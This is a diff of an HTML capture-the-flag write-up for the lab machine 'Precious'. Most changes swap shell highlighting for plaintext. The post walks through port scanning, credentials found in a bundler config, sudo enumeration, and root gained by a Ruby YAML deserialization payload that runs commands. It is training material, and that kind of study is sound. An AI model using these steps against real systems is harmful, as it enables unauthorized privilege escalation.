@@ -14,31 +14,32 @@
         
         
         
-        <p class="page-date-author-readtime">March 24, 2023 | 13 minutes </p>
+        <p class="page-date-author-readtime">March 24, 2023 | 12 minutes </p>
       
         
 <h1 id="enumeration">Enumeration</h1>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.93 scan initiated Mon Feb 20 17:17:13 2023 as: nmap -p- -sCV --min-rate=10000 -o preciousnmap.txt 10.10.11.189</span>
-Warning: 10.10.11.189 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span><span class="nb">.</span>
-Nmap scan report <span class="k">for </span>precious.htb <span class="o">(</span>10.10.11.189<span class="o">)</span>
-Host is up <span class="o">(</span>0.090s latency<span class="o">)</span><span class="nb">.</span>
-Not shown: 65257 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>, 276 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -p- -sCV --min-rate=10000 -o preciousnmap.txt 10.10.11.189
+# Nmap 7.93 scan initiated Mon Feb 20 17:17:13 2023 as: nmap -p- -sCV --min-rate=10000 -o preciousnmap.txt 10.10.11.189
+Warning: 10.10.11.189 giving up on port because retransmission cap hit (10).
+Nmap scan report for precious.htb (10.10.11.189)
+Host is up (0.090s latency).
+Not shown: 65257 closed tcp ports (conn-refused), 276 filtered tcp ports (no-response)
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
 | ssh-hostkey:
-|   3072 845e13a8e31e20661d235550f63047d2 <span class="o">(</span>RSA<span class="o">)</span>
-|   256 a2ef7b9665ce4161c467ee4e96c7c892 <span class="o">(</span>ECDSA<span class="o">)</span>
-|_  256 33053dcd7ab798458239e7ae3c91a658 <span class="o">(</span>ED25519<span class="o">)</span>
+|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
+|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
+|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
 80/tcp open  http    nginx 1.18.0
 |_http-title: Convert Web Page to PDF
 | http-server-header:
 |   nginx/1.18.0
-|_  nginx/1.18.0 + Phusion Passenger<span class="o">(</span>R<span class="o">)</span> 6.0.15
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; <span class="nb">.</span>
-<span class="c"># Nmap done at Mon Feb 20 17:17:35 2023 -- 1 IP address (1 host up) scanned in 21.95 seconds</span>
+Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
+# Nmap done at Mon Feb 20 17:17:35 2023 -- 1 IP address (1 host up) scanned in 21.95 seconds
 </code></pre></div></div>
 <p>The website has a text input box, and the purpose of it is to convert web pages to PDF files. I started playing around with it:</p>
 
@@ -56,16 +57,16 @@ Service detection performed. Please report any incorrect results at &lt;https://
 
 <h1 id="initial-access">Initial Access</h1>
 <p>Now that I had something new to work with, I wanted to know more about the generated file. I downloaded the file and ran a common file forensics tool called <code class="language-plaintext highlighter-rouge">exiftool</code> on it.</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>exiftool fo99la37ukytqmhduq8elzoqbudbyvu9.pdf
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ exiftool fo99la37ukytqmhduq8elzoqbudbyvu9.pdf
 
 ExifTool Version Number         : 12.52
 File Name                       : fo99la37ukytqmhduq8elzoqbudbyvu9.pdf
-Directory                       : <span class="nb">.</span>
+Directory                       : .
 File Size                       : 36 kB
 File Modification Date/Time     : 2023:02:20 16:39:42-08:00
 File Access Date/Time           : 2023:02:20 16:40:16-08:00
 File Inode Change Date/Time     : 2023:02:20 16:39:42-08:00
-File Permissions                : <span class="nt">-rw-r--r--</span>
+File Permissions                : -rw-r--r--
 File Type                       : PDF
 File Type Extension             : pdf
 MIME Type                       : application/pdf
@@ -109,29 +110,29 @@ And there was my shell.
 
 <h1 id="privilege-escalation">Privilege Escalation</h1>
 <p>I had access to the machine, but I was user <code class="language-plaintext highlighter-rouge">ruby</code>. The first thing I do after initial access to a machine is look at the obvious such as the contents of files (including hidden files).</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -lah
 total 36K
-drwxr-xr-x 6 root root 4.0K Oct 26  2022 <span class="nb">.</span>
+drwxr-xr-x 6 root root 4.0K Oct 26  2022 .
 drwxr-xr-x 4 root root 4.0K Oct 26  2022 ..
 drwxr-xr-x 4 root ruby 4.0K Oct 26  2022 app
 drwxr-xr-x 2 root ruby 4.0K Oct 26  2022 config
-<span class="nt">-rw-r--r--</span> 1 root ruby   59 Sep 10  2022 config.ru
-<span class="nt">-rw-r--r--</span> 1 root ruby   99 Sep 17  2022 Gemfile
-<span class="nt">-rw-r--r--</span> 1 root ruby  478 Sep 26  2022 Gemfile.lock
+-rw-r--r-- 1 root ruby   59 Sep 10  2022 config.ru
+-rw-r--r-- 1 root ruby   99 Sep 17  2022 Gemfile
+-rw-r--r-- 1 root ruby  478 Sep 26  2022 Gemfile.lock
 drwxrwxr-x 2 root ruby 4.0K Sep 26 15:54 pdf
 drwxr-xr-x 4 root ruby 4.0K Oct 26  2022 public
 </code></pre></div></div>
 <p>The directory I landed in didn’t seem to be a home directory. Instead, I was in <code class="language-plaintext highlighter-rouge">/var/www/pdfapp</code>. After some digging in that directory, I looked into <code class="language-plaintext highlighter-rouge">ruby</code>’s home directory.</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -lah
 total 28K
-drwxr-xr-x 4 ruby ruby 4.0K Sep 24 22:04 <span class="nb">.</span>
+drwxr-xr-x 4 ruby ruby 4.0K Sep 24 22:04 .
 drwxr-xr-x 4 root root 4.0K Oct 26  2022 ..
 lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -&gt; /dev/null
-<span class="nt">-rw-r--r--</span> 1 ruby ruby  220 Mar 27  2022 .bash_logout
-<span class="nt">-rw-r--r--</span> 1 ruby ruby 3.5K Mar 27  2022 .bashrc
+-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
+-rw-r--r-- 1 ruby ruby 3.5K Mar 27  2022 .bashrc
 dr-xr-xr-x 2 root ruby 4.0K Oct 26  2022 .bundle
 drwxr-xr-x 3 ruby ruby 4.0K Sep 24 22:04 .cache
-<span class="nt">-rw-r--r--</span> 1 ruby ruby  807 Mar 27  2022 .profile
+-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
 </code></pre></div></div>
 <p>After looking through all the files and directories, I finally found credentials in <code class="language-plaintext highlighter-rouge">~/.bundle/config</code> to user <code class="language-plaintext highlighter-rouge">henry</code>.</p>
 <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>config
@@ -139,18 +140,18 @@ drwxr-xr-x 3 ruby ruby 4.0K Sep 24 22:04 .cache
 BUNDLE_HTTPS://RUBYGEMS__ORG/: <span class="s2">"henry:Q3c1Aq......aXAYFH"</span>
 </code></pre></div></div>
 <p><code class="language-plaintext highlighter-rouge">henry</code> existed on the machine, so I attempted to login using <code class="language-plaintext highlighter-rouge">ssh</code>.</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh henry@10.10.11.189
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh henry@10.10.11.189
 </code></pre></div></div>
 <p>The credentials were valid, and I logged in as <code class="language-plaintext highlighter-rouge">henry</code>.</p>
 
 <p>From here, the next and last step was escalating to <code class="language-plaintext highlighter-rouge">root</code>. After some looking around, I wasn’t able to find much. I tried running <code class="language-plaintext highlighter-rouge">sudo -l</code>, which would reveal binaries explicitly enabled for my user to run as root, also known as an SUID.</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
-Matching Defaults entries <span class="k">for </span>henry on precious:
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~$ sudo -l
+Matching Defaults entries for henry on precious:
     env_reset, mail_badpass,
-    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User henry may run the following commands on precious:
-    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
 </code></pre></div></div>
 <p>And just like that, it revealed that I could run <code class="language-plaintext highlighter-rouge">/usr/bin/ruby /opt/update_dependencies.rb</code> as <code class="language-plaintext highlighter-rouge">root</code>! I instantly took a look at the ruby file I was permitted to run.</p>
 <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">henry</span><span class="vi">@precious</span><span class="ss">:~</span><span class="err">$</span> <span class="n">cat</span> <span class="sr">/opt/u</span><span class="n">pdate_dependencies</span><span class="p">.</span><span class="nf">rb</span>
@@ -186,17 +187,17 @@ User henry may run the following commands on precious:
 <span class="k">end</span>
 </code></pre></div></div>
 <p>Well this certainly didn’t look fun. I don’t know anything about <code class="language-plaintext highlighter-rouge">ruby</code>, much less how to read it. But the thing is, I didn’t need to know how to read it. I attempted to run the command and received the following output.</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~<span class="nv">$ </span><span class="nb">sudo </span>ruby /opt/update_dependencies.rb
-Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
-        2: from /opt/update_dependencies.rb:17:in <span class="sb">`</span>&lt;main&gt;<span class="s1">'
-        1: from /opt/update_dependencies.rb:10:in `list_from_file'</span>
-/opt/update_dependencies.rb:10:in <span class="sb">`</span><span class="nb">read</span><span class="s1">': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT)
-</span></code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~$ sudo ruby /opt/update_dependencies.rb
+Traceback (most recent call last):
+        2: from /opt/update_dependencies.rb:17:in `&lt;main&gt;'
+        1: from /opt/update_dependencies.rb:10:in `list_from_file'
+/opt/update_dependencies.rb:10:in `read': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT)
+</code></pre></div></div>
 <p>Having looked at the source code and previewing the command output, something that already stood out to me was that it was loading/reading a file called <code class="language-plaintext highlighter-rouge">dependencies.yml</code>. Furthermore, I wasn’t sure exactly where it was looking for this <code class="language-plaintext highlighter-rouge">dependencies.yml</code>. Perhaps it could possibly be looking for it locally? I created a local file in my home directory of the script and tried running the command again.</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~<span class="nv">$ </span><span class="nb">touch </span>dependencies.yml
-henry@precious:~<span class="nv">$ </span><span class="nb">sudo </span>ruby /opt/update_dependencies.rb
-Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
-/opt/update_dependencies.rb:20:in <span class="sb">`</span>&lt;main&gt;<span class="s1">': undefined method `each'</span> <span class="k">for </span><span class="nb">false</span>:FalseClass <span class="o">(</span>NoMethodError<span class="o">)</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~$ touch dependencies.yml
+henry@precious:~$ sudo ruby /opt/update_dependencies.rb
+Traceback (most recent call last):
+/opt/update_dependencies.rb:20:in `&lt;main&gt;': undefined method `each' for false:FalseClass (NoMethodError)
 </code></pre></div></div>
 <p>That was surely a different output than the previous. Okay, so I knew that I could load whatever content I wanted through <code class="language-plaintext highlighter-rouge">dependencies.yml</code>. How could I use this to my advantage? I searched for <code class="language-plaintext highlighter-rouge">ruby yaml exploits</code> and I found a blog post titled “<a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/">Blind Remote Code Execution through YAML Deserialization</a>”.</p>
 
@@ -222,17 +223,17 @@ Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
               <span class="ss">git_set: </span><span class="nb">id</span>
           <span class="ss">method_id: :resolve</span>
 </code></pre></div></div>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~<span class="nv">$ </span><span class="nb">sudo </span>ruby /opt/update_dependencies.rb
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~$ sudo ruby /opt/update_dependencies.rb
 sh: 1: reading: not found
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+uid=0(root) gid=0(root) groups=0(root)
+Traceback (most recent call last):
 ...
-/usr/lib/ruby/2.7.0/net/protocol.rb:458:in <span class="sb">`</span>system<span class="s1">': no implicit conversion of nil into String (TypeError)
-</span></code></pre></div></div>
+/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
+</code></pre></div></div>
 <p>Nice, I had RCE as <code class="language-plaintext highlighter-rouge">root</code>! To recall, I knew I could run the script as <code class="language-plaintext highlighter-rouge">root</code> after running <code class="language-plaintext highlighter-rouge">sudo -l</code>. Then, I accomplished RCE through the file <code class="language-plaintext highlighter-rouge">dependencies.yml</code> that was being loaded in the <code class="language-plaintext highlighter-rouge">update_dependencies.rb</code> script by deserialization.</p>
 
 <p>The last step was to run a shell command that would make me <code class="language-plaintext highlighter-rouge">root</code>. A quick way to do this was setting the command to <code class="language-plaintext highlighter-rouge">su</code>, which would change my user to <code class="language-plaintext highlighter-rouge">root</code>.</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~<span class="nv">$ </span><span class="nb">sudo </span>ruby /opt/update_dependencies.rb
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~$ sudo ruby /opt/update_dependencies.rb
 sh: 1: reading: not found
 root@precious:/home/henry#
 </code></pre></div></div>
